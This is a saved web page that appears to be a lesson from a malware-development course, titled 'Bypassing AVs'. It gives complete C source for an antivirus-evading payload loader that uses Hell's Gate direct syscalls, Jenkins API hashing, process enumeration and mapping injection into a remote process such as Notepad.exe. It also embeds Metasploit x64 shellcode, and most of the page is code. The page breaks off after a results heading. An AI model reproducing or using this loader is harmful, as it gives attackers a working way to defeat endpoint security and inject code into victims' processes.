                <div id="dl-dropdown" class="hidden absolute right-0 mt-8 w-32 border-[2px] border-gray-500 rounded-md shadow-lg z-50" role="menu" aria-orientation="vertical" aria-labelledby="dl-btn">
                    
                    <a href="https://maldevacademy.com/download/file/Bypassing-AVs?lang=c" class="block px-4 bg-gray-700 py-2 text-sm hover:bg-gray-800 rounded-t-sm" role="menuitem">C Code</a>
                    <a href="https://maldevacademy.com/download/file/Bypassing-AVs?lang=rust" class="block px-4 py-2 bg-gray-700 text-sm hover:bg-gray-800 rounded-b-sm" role="menuitem">Rust Code</a>
                </div>
                </div>
                            </div>
</div>
      <div id="height-container" class="flex h-full min-h-[800px]">
          <div class="flex max-w-full min-w-full">
              <div class="flex-1 min-w-0">
                  
                  <div id="description-container" class="viewer code-description h-full w-full bg-gray-800/70 backdrop-blur-md backdrop-saturate-150 p-4 px-5 md:px-10 lg:px-20 border border-t-0 border-gray-600/60 shadow-inner">

    
    <div id="module-skeleton" role="status" aria-live="polite" class="absolute inset-0 z-20 overflow-hidden bg-slate-900/70 ring-1 ring-white/10">
    <div class="h-full w-full max-w-5xl mx-auto py-8 animate-pulse motion-reduce:animate-none flex flex-col">

        
        <div class="flex flex-col items-center gap-3">
        <div class="h-7 w-72 rounded-xl bg-white/15"></div>
        <div class="h-px w-full bg-white/10"></div>
        </div>

        
        <div class="h-6 w-40 rounded-lg bg-white/12"></div>

        
        <div class="space-y-3 mb-6">
        <div class="h-4 w-full rounded-lg bg-white/10"></div>
        <div class="h-4 w-11/12 rounded-lg bg-white/10"></div>
        <div class="h-4 w-10/12 rounded-lg bg-white/10"></div>
        <div class="h-4 w-9/12  rounded-lg bg-white/10"></div>
        </div>

        
        <div class="h-56 md:h-72 lg:h-80 rounded-xl bg-white/5 ring-1 ring-white/10 flex items-center justify-center">
        <svg viewBox="0 0 64 64" aria-hidden="true" class="w-12 h-12 text-white/30" fill="none" stroke="currentColor" stroke-width="2">
            <rect x="8" y="14" width="48" height="36" rx="3" class="opacity-30"></rect>
            <circle cx="26" cy="28" r="5"></circle>
            <path d="M16 46l12-14 8 10 8-8 12 12"></path>
        </svg>
        </div>

        
        <div class="mt-6 flex-1 relative rounded-xl overflow-hidden">
        <div class="absolute inset-0 rounded-xl" style="
            background:
                linear-gradient(to right, transparent 0, transparent 8px, rgba(255,255,255,0.00) 8px, rgba(255,255,255,0.00) calc(100% - 8px), transparent 100%),
                repeating-linear-gradient(
                to bottom,
                rgba(255,255,255,0.10),                 /* line color */
                rgba(255,255,255,0.10) 12px,            /* line thickness */
                rgba(255,255,255,0.00) 12px,            /* gap start */
                rgba(255,255,255,0.00) 22px             /* gap height */
                );
            ">
        </div>
        </div>

    </div>
    </div>


    
    

    
    <div id="module-content" class="opacity-0 transition-opacity duration-300">
        <h2>Bypassing AVs</h2>
<h3>Introduction</h3>
<p>So far, numerous methods and techniques to create and execute a 
payload loader that can bypass a variety of software security programs 
have been demonstrated. This module will work to construct a 
feature-rich payload loader from the ground up to reinforce what has 
been taught in the previous modules.</p>
<p>Create an empty Visual Studio project and follow along to keep up with this module.</p>
<h3>Payload Loader Features</h3>
<p>The implemented payload loader will have the following features:</p>
<ul>
<li>Remote code injection support</li>
<li>Mapping injection using direct syscalls via Hell's Gate</li>
<li>API Hashing</li>
<li>Anti-Analysis functionality</li>
<li>RC4 payload encryption</li>
<li>Brute forcing the decryption key</li>
<li>No CRT library imports</li>
</ul>
<h3>Hell's Gate Setup</h3>
<p>This loader utilizes payload injection via direct syscalls obtained using Hell's Gate. To begin, one must create <code>Structs.h</code>, <code>HellsGate.c</code> and <code>HellAsm.asm</code> files. These files include the necessary functions to execute direct syscalls. The <code>Structs.h</code>
 file is used to save Windows undocumented structures and is included in
 subsequent C files. It contains structure definitions such as <code>PEB</code>, <code>TEB</code>, and more, which are necessary for implementing Hell's Gate.</p>
<p>The <code>HellAsm.asm</code> file will be the same as the one from the <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/hellsgate.asm">repository</a>. As for <code>HellsGate.c</code>, it will have the following functions.</p>
<p><strong>HellsGate.c</strong></p>
<pre><code class="language-C">#include &lt;Windows.h&gt;
#include "Structs.h"


PTEB RtlGetThreadEnvironmentBlock() {
#if _WIN64
	return (PTEB)__readgsqword(0x30);
#else
	return (PTEB)__readfsdword(0x16);
#endif
}


BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY*
 ppImageExportDirectory) {
	// Get DOS header
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
	if (pImageDosHeader-&gt;e_magic != IMAGE_DOS_SIGNATURE) {
		return FALSE;
	}

	// Get NT headers
	PIMAGE_NT_HEADERS pImageNtHeaders = 
(PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader-&gt;e_lfanew);
	if (pImageNtHeaders-&gt;Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}

	// Get the EAT
	*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase +
 pImageNtHeaders-&gt;OptionalHeader.DataDirectory[0].VirtualAddress);
	return TRUE;
}

BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY 
pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
	PDWORD pdwAddressOfFunctions   = (PDWORD)((PBYTE)pModuleBase + 
pImageExportDirectory-&gt;AddressOfFunctions);
	PDWORD pdwAddressOfNames       = (PDWORD)((PBYTE)pModuleBase + 
pImageExportDirectory-&gt;AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + 
pImageExportDirectory-&gt;AddressOfNameOrdinals);

	for (WORD cx = 0; cx &lt; pImageExportDirectory-&gt;NumberOfNames; 
cx++) {
		PCHAR pczFunctionName  = (PCHAR)((PBYTE)pModuleBase + 
pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PBYTE)pModuleBase + 
pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

		if (djb2(pczFunctionName) == pVxTableEntry-&gt;uHash) {
			pVxTableEntry-&gt;pAddress = pFunctionAddress;

			// Quick and dirty fix in case the function has been hooked
			WORD cw = 0;
			while (TRUE) {
				// check if syscall, in this case we are too far
				if (*((PBYTE)pFunctionAddress + cw) == 0x0f &amp;&amp; 
*((PBYTE)pFunctionAddress + cw + 1) == 0x05)
					return FALSE;

				// check if ret, in this case we are also probaly too far
				if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
					return FALSE;

				// First opcodes should be :
				//    MOV R10, RCX
				//    MOV EAX, &lt;syscall&gt;
				if (*((PBYTE)pFunctionAddress + cw) == 0x4c
					&amp;&amp; *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
					&amp;&amp; *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
					&amp;&amp; *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
					&amp;&amp; *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
					&amp;&amp; *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
					BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
					BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
					pVxTableEntry-&gt;wSystemCall = (high &lt;&lt; 8) | low;
					break;
				}

				cw++;
			};
		}
	}

	if (pVxTableEntry-&gt;wSystemCall != NULL)
		return TRUE;
	else
		return FALSE;
}

</code></pre>
<p>The code above does not have the <code>VX_TABLE_ENTRY</code> structure or the <code>djb2</code> function defined. To solve this, two new files will be created: <code>WinApi.c</code> and <code>Common.h</code>.</p>
<ul>
<li>
<p><code>WinApi.c</code> - This file is used to store the CRT library 
replacement functions and the string hashing functions used in Hell's 
Gate and the API Hahsing implementation.</p>
</li>
<li>
<p><code>Common.h</code> - This file provides common function prototypes
 to enable calling a function from a different file, as well as custom 
structure definitions, hashes values of the syscalls, and WinAPIs.</p>
</li>
</ul>
<p>The <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L92">djb2</a> string hashing function is replaced with the following <code>HashStringJenkinsOneAtATime32BitA/W</code> functions, hence changing the original string hashing algorithm used in Hell's Gate.</p>
<p><strong>WinApi.c</strong></p>
<pre><code class="language-C">#include &lt;Windows.h&gt;

#include "Structs.h"
#include "Common.h"


UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String)
{
	SIZE_T Index = 0;
	UINT32 Hash = 0;
	SIZE_T Length = lstrlenA(String);

	while (Index != Length)
	{
		Hash += String[Index++];
		Hash += Hash &lt;&lt; INITIAL_SEED;
		Hash ^= Hash &gt;&gt; 6;
	}

	Hash += Hash &lt;&lt; 3;
	Hash ^= Hash &gt;&gt; 11;
	Hash += Hash &lt;&lt; 15;

	return Hash;
}


UINT32 HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String)
{
	SIZE_T Index = 0;
	UINT32 Hash = 0;
	SIZE_T Length = lstrlenW(String);

	while (Index != Length)
	{
		Hash += String[Index++];
		Hash += Hash &lt;&lt; INITIAL_SEED;
		Hash ^= Hash &gt;&gt; 6;
	}

	Hash += Hash &lt;&lt; 3;
	Hash ^= Hash &gt;&gt; 11;
	Hash += Hash &lt;&lt; 15;

	return Hash;
}
</code></pre>
<p><strong>Common.h</strong></p>
<pre><code class="language-C">#pragma once

#include &lt;Windows.h&gt;

// Seed of the HashStringJenkinsOneAtATime32BitA/W funtion in 'WinApi.c'
#define INITIAL_SEED	8

UINT32 HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String);
UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String);

#define HASHA(API) (HashStringJenkinsOneAtATime32BitA((PCHAR) API))
#define HASHW(API) (HashStringJenkinsOneAtATime32BitW((PWCHAR) API))

// These are function prototypes - functions are defined in 'HellsGate.c'
PTEB RtlGetThreadEnvironmentBlock();
BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory);
BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry);

// These are functions prototypes - functions are defined in 'HellAsm.asm'
extern VOID HellsGate(WORD wSystemCall);
extern HellDescent();
</code></pre>
<p>Define the <code>VX_TABLE_ENTRY</code> in the <code>Common.h</code> file, then update the <code>HellsGate.c</code> file to include it and utilize <code>HASHA</code> instead of <code>djb2</code> as the hashing function.</p>
<p><strong>VX_TABLE_ENTRY</strong></p>
<pre><code class="language-C">typedef struct _VX_TABLE_ENTRY {
	PVOID   pAddress;
	UINT32	uHash;
	WORD    wSystemCall;
} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;
</code></pre>
<h3>Calculating Syscall Hashes</h3>
<p>A new project must be created in order to calculate the hash values of the syscalls used and print them to the console. The <code>Hasher</code> project will have one C file which is shown below.</p>
<p><strong>Hasher.c</strong></p>
<pre><code class="language-C">#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;


#define STR "_JOAA"
#define INITIAL_SEED 8


UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String)
{
	SIZE_T Index = 0;
	UINT32 Hash = 0;
	SIZE_T Length = lstrlenA(String);

	while (Index != Length)
	{
		Hash += String[Index++];
		Hash += Hash &lt;&lt; INITIAL_SEED;
		Hash ^= Hash &gt;&gt; 6;
	}

	Hash += Hash &lt;&lt; 3;
	Hash ^= Hash &gt;&gt; 11;
	Hash += Hash &lt;&lt; 15;

	return Hash;
}


UINT32 HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String)
{
	SIZE_T Index = 0;
	UINT32 Hash = 0;
	SIZE_T Length = lstrlenW(String);

	while (Index != Length)
	{
		Hash += String[Index++];
		Hash += Hash &lt;&lt; INITIAL_SEED;
		Hash ^= Hash &gt;&gt; 6;
	}

	Hash += Hash &lt;&lt; 3;
	Hash ^= Hash &gt;&gt; 11;
	Hash += Hash &lt;&lt; 15;

	return Hash;
}



int main() {

	printf("#define %s%s \t0x%0.8X \n", "NtCreateSection", STR, HashStringJenkinsOneAtATime32BitA("NtCreateSection"));
	printf("#define %s%s \t0x%0.8X \n", "NtMapViewOfSection", STR, HashStringJenkinsOneAtATime32BitA("NtMapViewOfSection"));
	printf("#define %s%s \t0x%0.8X \n", "NtUnmapViewOfSection", STR, HashStringJenkinsOneAtATime32BitA("NtUnmapViewOfSection"));
	printf("#define %s%s \t0x%0.8X \n", "NtClose", STR, HashStringJenkinsOneAtATime32BitA("NtClose"));
	printf("#define %s%s \t0x%0.8X \n", "NtCreateThreadEx", STR, HashStringJenkinsOneAtATime32BitA("NtCreateThreadEx"));
	printf("#define %s%s \t0x%0.8X \n", "NtWaitForSingleObject", STR, HashStringJenkinsOneAtATime32BitA("NtWaitForSingleObject"));
  
  return 0;
}
</code></pre>
<h4>Hasher Results</h4>
<p>Once compiled and ran, the program will generate the following results which should be copied to the <code>Common.h</code> file.</p>
<p><img src="81_files/av-bypass-116769871-25449179-cdfb-412b-899f-1744ac77246b.png" alt="image"></p>
<p>Additionally, the new <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L14">VX_TABLE</a> structure definition must be updated to include the syscalls that will be utilized.</p>
<pre><code class="language-C">typedef struct _VX_TABLE {

	VX_TABLE_ENTRY NtCreateSection;
	VX_TABLE_ENTRY NtMapViewOfSection;
	VX_TABLE_ENTRY NtUnmapViewOfSection;
	VX_TABLE_ENTRY NtClose;
	VX_TABLE_ENTRY NtCreateThreadEx;
	VX_TABLE_ENTRY NtWaitForSingleObject;

} VX_TABLE, * PVX_TABLE;

</code></pre>
<h3>Payload Injection Via Hell's Gate</h3>
<p>With Hell's Gate successfully set up, the payload injection implementation can be made. A new file will be created, <code>Inject.c</code> which is shown below.</p>
<p>The following points briefly explain the <code>Inject.c</code> file:</p>
<ul>
<li>
<p><code>InitializeSyscalls</code> - This function initializes the global <code>g_Sys</code> variable of type <code>VX_TABLE</code> to be used later on.</p>
</li>
<li>
<p><code>RemoteMappingInjectionViaSyscalls</code> - This function supports both local and remote mapping injection via the <code>bLocal</code> parameter which is set to <code>TRUE</code> to inject the payload locally, or <code>FALSE</code> for remote injection.</p>
<ul>
<li>If the <code>bLocal</code> parameter is set to <code>TRUE</code>, the <code>dwLocalFlag</code> variable will be set to <code>PAGE_EXECUTE_READWRITE</code> to be suitable for local payload execution, and the second <code>NtMapViewOfSection</code> will be avoided. But if <code>bLocal</code> is <code>FALSE</code>, the <code>dwLocalFlag</code> will remain <code>PAGE_READWRITE</code> and the function will run the second <code>NtMapViewOfSection</code> call to allocate memory remotely.</li>
<li>The <code>pExecAddress</code> variable is used to save the base 
address of the injected payload. It is equal to the base address of the 
locally injected payload (<code>pLocalAddress</code>) if the function is set to execute the payload locally, or the remote injected payload base address (<code>pRemoteAddress</code>) if the function is set to execute the payload remotely.</li>
<li>The <code>pExecAddress</code> variable will be then passed to the <code>NtCreateThreadEx</code> syscall to execute the payload whenever it was.</li>
</ul>
</li>
</ul>
<p><strong>Inject.c</strong></p>
<pre><code class="language-C">#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;


#include "Structs.h"
#include "Common.h"

// global `VX_TABLE` structure
VX_TABLE 	g_Sys = { 0 };



BOOL InitializeSyscalls() {

	// Get the PEB
	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
	PPEB pCurrentPeb = pCurrentTeb-&gt;ProcessEnvironmentBlock;
	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb-&gt;OSMajorVersion != 
0xA)
		return FALSE;

	// Get NTDLL module 
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = 
(PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb-&gt;Ldr-
&gt;InMemoryOrderModuleList.Flink-&gt;Flink - 0x10);

	// Get the EAT of NTDLL
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry-&gt;DllBase, 
&amp;pImageExportDirectory) || pImageExportDirectory == NULL)
		return FALSE;

	g_Sys.NtCreateSection.uHash       = NtCreateSection_JOAA;
	g_Sys.NtMapViewOfSection.uHash    = NtMapViewOfSection_JOAA;
	g_Sys.NtUnmapViewOfSection.uHash  = NtUnmapViewOfSection_JOAA;
	g_Sys.NtClose.uHash               = NtClose_JOAA;
	g_Sys.NtCreateThreadEx.uHash      = NtCreateThreadEx_JOAA;
	g_Sys.NtWaitForSingleObject.uHash = NtWaitForSingleObject_JOAA;

	// initialize the syscalls
	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, 
&amp;g_Sys.NtCreateSection))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, 
&amp;g_Sys.NtMapViewOfSection))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, 
&amp;g_Sys.NtUnmapViewOfSection))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, 
&amp;g_Sys.NtClose))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, 
&amp;g_Sys.NtCreateThreadEx))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, 
&amp;g_Sys.NtWaitForSingleObject))
		return FALSE;



	return TRUE;
}

BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID 
pPayload, IN SIZE_T sPayloadSize, IN BOOL bLocal) {

        HANDLE          hSection          = NULL;
        HANDLE          hThread           = NULL;
        PVOID           pLocalAddress     = NULL,
                        pRemoteAddress    = NULL,
                        pExecAddress      = NULL;
        NTSTATUS        STATUS            = NULL;
        SIZE_T          sViewSize         = NULL;
        LARGE_INTEGER   MaximumSize       = {
              .HighPart = 0,
              .LowPart = sPayloadSize
        };

        DWORD           dwLocalFlag       = PAGE_READWRITE;

	
//--------------------------------------------------------------------------

    // Allocating local map view 
	HellsGate(g_Sys.NtCreateSection.wSystemCall);
	if ((STATUS = HellDescent(&amp;hSection, SECTION_ALL_ACCESS, NULL, 
&amp;MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
		printf("[!] NtCreateSection Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	if (bLocal) {
		dwLocalFlag = PAGE_EXECUTE_READWRITE;
	}

	HellsGate(g_Sys.NtMapViewOfSection.wSystemCall);
	if ((STATUS = HellDescent(hSection, (HANDLE)-1, &amp;pLocalAddress, 
NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, dwLocalFlag)) != 0) {
		printf("[!] NtMapViewOfSection [L] Failed With Error : 0x%0.8X \n", 
STATUS);
		return FALSE;
	}

	printf("[+] Local Memory Allocated At : 0x%p Of Size : %d \n", 
pLocalAddress, sViewSize);

	
//--------------------------------------------------------------------------

    // Writing the payload
	printf("[#] Press &lt;Enter&gt; To Write The Payload ... ");
	getchar();
	memcpy(pLocalAddress, pPayload, sPayloadSize);
	printf("\t[+] Payload is Copied From 0x%p To 0x%p \n", pPayload, 
pLocalAddress);

	
//--------------------------------------------------------------------------

        // Allocating remote map view 
        if (!bLocal) {

          HellsGate(g_Sys.NtMapViewOfSection.wSystemCall);
          if ((STATUS = HellDescent(hSection, hProcess, 
&amp;pRemoteAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, 
PAGE_EXECUTE_READWRITE)) != 0) {
            printf("[!] NtMapViewOfSection [R] Failed With Error : 
0x%0.8X \n", STATUS);
            return FALSE;
          }

          printf("[+] Remote Memory Allocated At : 0x%p Of Size : %d 
\n", pRemoteAddress, sViewSize);

        }

	
//--------------------------------------------------------------------------

    // Executing the payload via thread creation
    pExecAddress = pRemoteAddress;
	if (bLocal) {
		pExecAddress = pLocalAddress;
	}
	printf("[#] Press &lt;Enter&gt; To Run The Payload ... ");
	getchar();
	printf("\t[i] Running Thread Of Entry 0x%p ... ", pExecAddress);
	HellsGate(g_Sys.NtCreateThreadEx.wSystemCall);
	if ((STATUS = HellDescent(&amp;hThread, THREAD_ALL_ACCESS, NULL, 
hProcess, pExecAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
		printf("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	printf("[+] DONE \n");
	printf("\t[+] Thread Created With Id : %d \n", GetThreadId(hThread));

	
//--------------------------------------------------------------------------

    // Waiting for the thread to finish
	HellsGate(g_Sys.NtWaitForSingleObject.wSystemCall);
	if ((STATUS = HellDescent(hThread, FALSE, NULL)) != 0) {
		printf("[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n", 
STATUS);
		return FALSE;
	}
	
	// Unmapping the local view
	HellsGate(g_Sys.NtUnmapViewOfSection.wSystemCall);
	if ((STATUS = HellDescent((HANDLE)-1, pLocalAddress)) != 0) {
		printf("[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n", 
STATUS);
		return FALSE;
	}

    // Closing the section handle
	HellsGate(g_Sys.NtClose.wSystemCall);
	if ((STATUS = HellDescent(hSection)) != 0) {
		printf("[!] NtClose Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	return TRUE;
}
</code></pre>
<h4>Process Enumeration</h4>
<p>In order to create a complete process injection module, the usage of the <code>NtQuerySystemInformation</code> syscall is required to fetch a target process handle, as outlined in the <em>Process Enumeration - NtQuerySystemInformation</em> module.</p>
<p>The use of a new syscall will require the <code>VX_TABLE</code> structure to be updated to include one more element, <code>VX_TABLE_ENTRY NtQuerySystemInformation</code> for it to be initialized by the <code>InitializeSyscalls</code> function. Additionally, use the <code>Hasher</code> program to calculate a hash value for the "NtQuerySystemInformation" string.</p>
<pre><code class="language-C">BOOL GetRemoteProcessHandle(IN LPCWSTR 
szProcName, IN DWORD* pdwPid, IN HANDLE* phProcess) {

	ULONG					    uReturnLen1 		= NULL,
						        uReturnLen2 		= NULL;
	PSYSTEM_PROCESS_INFORMATION  SystemProcInfo 	= NULL;
	PVOID					    pValueToFree 	= NULL;
	NTSTATUS				    STATUS 			= NULL;

	// This will fail with status = STATUS_INFO_LENGTH_MISMATCH, but that's
 ok, because we need to know how much to allocate (uReturnLen1)
	HellsGate(g_Sys.NtQuerySystemInformation.wSystemCall);
	HellDescent(SystemProcessInformation, NULL, NULL, &amp;uReturnLen1);

	// Allocating enough buffer for the returned array of 
`SYSTEM_PROCESS_INFORMATION` struct
	SystemProcInfo = 
(PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), 
HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
	if (SystemProcInfo == NULL) {
		return FALSE;
	}

	// Since we will modify 'SystemProcInfo', we will save its intial value
 before the while loop to free it later
	pValueToFree = SystemProcInfo;

	// Calling NtQuerySystemInformation with the right arguments, the 
output will be saved to 'SystemProcInfo'
	HellsGate(g_Sys.NtQuerySystemInformation.wSystemCall);
	STATUS = HellDescent(SystemProcessInformation, SystemProcInfo, 
uReturnLen1, &amp;uReturnLen2);
	if (STATUS != 0x0) {
		printf("[!] NtQuerySystemInformation Failed With Error : 0x%0.8X \n", 
STATUS);
		return FALSE;
	}

	while (TRUE) {

		// Small check for the process's name size
		// Comparing the enumerated process name to what we want to target
		if (SystemProcInfo-&gt;ImageName.Length &amp;&amp; 
HASHW(SystemProcInfo-&gt;ImageName.Buffer) == HASHW(szProcName)) {
			// Opening a handle to the target process and saving it, then 
breaking 
			*pdwPid = (DWORD)SystemProcInfo-&gt;UniqueProcessId;
			*phProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 
(DWORD)SystemProcInfo-&gt;UniqueProcessId);
			break;
		}

		// If NextEntryOffset is 0, we reached the end of the array
		if (!SystemProcInfo-&gt;NextEntryOffset)
			break;

		// Moving to the next element in the array
		SystemProcInfo = 
(PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + 
SystemProcInfo-&gt;NextEntryOffset);
	}

	// Freeing using the initial address
	HeapFree(GetProcessHeap(), 0, pValueToFree);

	// Checking if we got the target's process handle
	if (*pdwPid == NULL || *phProcess == NULL)
		return FALSE;
	else
		return TRUE;
}
</code></pre>
<h3>Main Function</h3>
<p>To test the code so far, create <code>main.c</code> which will contain the entry point function of the loader along with the usual Msfvenom calc payload.</p>
<p>The following points briefly explain the main function:</p>
<ul>
<li>
<p>The <code>InitializeSyscalls</code> function is the first function to be called. All other functions depend on it to initialize the syscall structure.</p>
</li>
<li>
<p>If <code>TARGET_PROCESS</code> is defined, <code>GetRemoteProcessHandle</code> is called to retrieve the target process handle and pass its output to <code>RemoteMappingInjectionViaSyscalls</code>.</p>
</li>
<li>
<p>If <code>TARGET_PROCESS</code> is not defined, the code directly calls <code>RemoteMappingInjectionViaSyscalls</code> with a pseudo value to the local process handle (<code>-1</code>), instructing it to inject the payload locally.</p>
</li>
</ul>
<p><strong>main.c</strong></p>
<pre><code class="language-C">#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;


#include "Structs.h"
#include "Common.h"


// comment to inject to the local process
//
#define TARGET_PROCESS	L"Notepad.exe"


// x64 calc metasploit
unsigned char Payload [] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};



int main() {
	
	DWORD		dwProcessId		= NULL;
	HANDLE		hProcess		= NULL;


	if (!InitializeSyscalls()) {
		printf("[!] Failed To Initialize Syscalls Structure \n");
		return -1;
	}


#ifdef TARGET_PROCESS

	wprintf(L"[i] Targetting Remote Process %s ... \n", TARGET_PROCESS);
	if (!GetRemoteProcessHandle(TARGET_PROCESS, &amp;dwProcessId, &amp;hProcess)) {
		printf("[!] Could Not Find Target Process Id \n");
		return -1;
	}
	printf("[+] Target Process Id Detected Of PID : %d \n", dwProcessId);

	if (!RemoteMappingInjectionViaSyscalls(hProcess, Payload, sizeof(Payload), FALSE)) {
		printf("[!] Failed To Inject Payload \n");
		return -1;
	}


#endif // TARGET_PROCESS



#ifndef TARGET_PROCESS

	if (!RemoteMappingInjectionViaSyscalls((HANDLE)-1, Payload, sizeof(Payload), TRUE)) {
		printf("[!] Failed To Inject Payload \n");
		return -1;
	}

#endif // !TARGET_POCESS


	return 0;
}

</code></pre>
<h3>Loader Results</h3>
<h4>Remote Code Injection</h4>
<p><img src="81_files/av-bypass-216782299-f2e9c796-2d79-42e9-b69d-6e4277f531f4.png" alt="image">
<img src="81_files/av-bypass-316782324-aafb32f5-4fec-40e0-bbb3-029ead10c99d.png" alt="image"></p>
<h4>Local Code Injection</h4>
<p><img src="81_files/av-bypass-416782441-c87f902c-af70-4657-ad39-93d2f977673b.png" alt="image">
